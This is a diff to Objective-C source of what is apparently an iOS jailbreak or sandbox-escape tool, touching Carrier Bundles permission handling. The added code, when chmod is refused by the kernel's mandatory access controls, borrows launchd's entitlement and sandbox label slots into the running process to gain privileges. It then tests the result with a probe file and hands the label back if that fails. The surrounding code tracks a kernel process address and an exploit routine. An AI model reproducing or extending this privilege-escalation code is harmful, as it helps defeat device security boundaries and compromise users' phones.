@@ -563,6 +563,7 @@ static NSString * const kCarrierBundlesRoot = @"/var/mobile/Library/Carrier Bund
 static NSMutableSet<NSString *> *g_chowned_roots = nil;
 static dispatch_queue_t g_chown_queue = NULL;
 static volatile BOOL g_sandbox_escaped = NO;
+static uint64_t g_self_proc = 0;
 static volatile BOOL g_exploit_started = NO;
 
 static void scheduleExploitOnce(void);
@@ -716,6 +717,38 @@ static BOOL carrier_apply_permissions(const char *cpath, mode_t mode) {
     NSLog(@"[CarrierBundles] direct chmod: %s -> 0%o rc=%d errno=%d",
           cpath, mode & 07777, rc, chmodErrno);
     if (rc == 0) return YES;
+
+    // chmod reached the kernel and was refused with EPERM while the directory
+    // is 0755 and owned by our own uid, so the refusal is MAC, not DAC: the
+    // permission bits are simply not the gate. Borrow launchd's label slots
+    // (AMFI slot = entitlements, sandbox object = profile) and retry, then
+    // prove the result with a real create+unlink inside the directory instead
+    // of trusting a return code.
+    uint64_t prev_slots[2] = { 0, 0 };
+    if (g_self_proc && sbx_adopt_launchd_privileges(g_self_proc, 1, prev_slots) == 0) {
+        errno = 0;
+        int rc2 = chmod(cpath, mode & 07777);
+        int rc2errno = errno;
+        NSLog(@"[CarrierBundles] chmod after privilege adopt: rc=%d errno=%d", rc2, rc2errno);
+
+        char privProbe[1200];
+        snprintf(privProbe, sizeof(privProbe), "%s/.cwp_priv_%d", cpath, (int)getpid());
+        errno = 0;
+        int pfd = open(privProbe, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        int pErr = errno;
+        if (pfd >= 0) {
+            close(pfd);
+            unlink(privProbe);
+        }
+        NSLog(@"[CarrierBundles] privilege proof (create/unlink in the dir): fd=%d errno=%d",
+              pfd, pErr);
+
+        if (rc2 == 0 || pfd >= 0) return YES;
+
+        // The transplant did not help, so hand the label back: the session
+        // must keep behaving exactly as it did before this save attempt.
+        sbx_restore_label_slots(g_self_proc, prev_slots);
+    }
 
     errno = 0;
     int arc = apfs_mod(cpath, mode & 07777);
@@ -1041,6 +1074,7 @@ static void runExploit(void) {
     cw_probe("before-escape");
 
     uint64_t self_proc_addr = proc_self();
+    g_self_proc = self_proc_addr;
 
     // The extension offsets inherited from another iOS build were never
     // verified here, and the old "SANDBOX ESCAPED" proof point was a false
